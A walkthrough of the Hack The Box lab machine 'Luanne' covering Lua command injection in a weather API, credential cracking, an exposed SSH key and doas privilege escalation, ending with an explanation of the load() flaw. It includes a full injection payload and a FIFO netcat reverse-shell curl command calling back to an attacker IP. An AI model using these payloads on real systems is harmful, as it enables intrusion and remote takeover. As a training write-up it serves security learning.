**HTB: Luanne Walkthrough**

---

### Recon

**Nmap Scan:**
- Open ports: 22 (SSH), 80 (HTTP), 9001 (Supervisor Process Manager)
- OS: NetBSD
- TCP 9001 is running Supervisor Process Manager, protected by HTTP Basic Auth

**Supervisor Manager:**
- Default credentials `user:123` worked
- Found process showing `/usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua`
- Indicates a Lua script serving weather API on localhost:3000

**Port 80 HTTP:**
- Protected by HTTP Basic Auth
- `.htpasswd` file found with hash
- Cracked to `webapi_user:iamthebest`
- Gave access to basic HTML with links to the weather API

---

### Weather API Enumeration

- Endpoint: `/weather/forecast`
- Accepts parameter: `city`
- `city=list` reveals cities
- Invalid city gives a 500 error with `unknown city: input`

**Potential Injection Point:**
- Submitting `'` crashes script
- Submitting `') os.execute('id') --` results in command execution
- Verified command injection via Lua using `os.execute`

**Reverse Shell via FIFO method:**
```bash
curl -G --data-urlencode "city=') os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.11 443 >/tmp/f') --" 'http://10.10.10.218/weather/forecast'
```
- Connected back as user `_http`

---

### PrivEsc to `r.michaels`

**In `/var/www`:**
- `.htpasswd` file with different hash
- Cracked to `webapi_user:iamthebest`

**From supervisord output:**
- User `r.michaels` running another web server on 127.0.0.1:3001
- Lua script served from `/home/r.michaels/devel/webapi/weather.lua`

**Localhost Port 3001:**
- Used credentials on `http://127.0.0.1:3001/~r.michaels/`
- Directory listing exposed `id_rsa`
- SSH key retrieved and used to login as `r.michaels`

---

### PrivEsc to root

**Found `/usr/pkg/etc/doas.conf`:**
- Allowed `r.michaels` to run anything as root
- Needed password

**Found encrypted backup in `~/backups/`:**
- `devel_backup-2020-09-16.tar.gz.enc`

**Used netpgp to decrypt:**
```bash
netpgp --decrypt --output=/tmp/backup.tar.gz backups/devel_backup-2020-09-16.tar.gz.enc
```

**Inside decrypted archive:**
- Found `.htpasswd` with hash
- Cracked to `littlebear`
- Used with `doas` to get root shell:
```bash
doas -u root sh
Password: littlebear
```

**Root Flag Captured**

---

### Beyond Root: Lua Injection Insight

**Vulnerability was in:**
```lua
local json = string.format([[
  httpd.write('{"code": 500,')
  httpd.write('"error": "unknown city: %s"}')
]], city)
load(json)()
```
- Unescaped input allowed arbitrary code execution

**Fixed in dev version:**
```lua
httpd.write('"error": "unknown city: ' .. city .. '"}')
```
- Avoided use of `load()`

---

**Summary:**
- Initial foothold via Lua injection on weather API
- User escalation via exposed SSH key in web directory
- Root via encrypted backup revealing password used for `doas`

---

**Flags:**
- User: `ea5f0ce6...`
- Root: `7a9b5c20...`

---

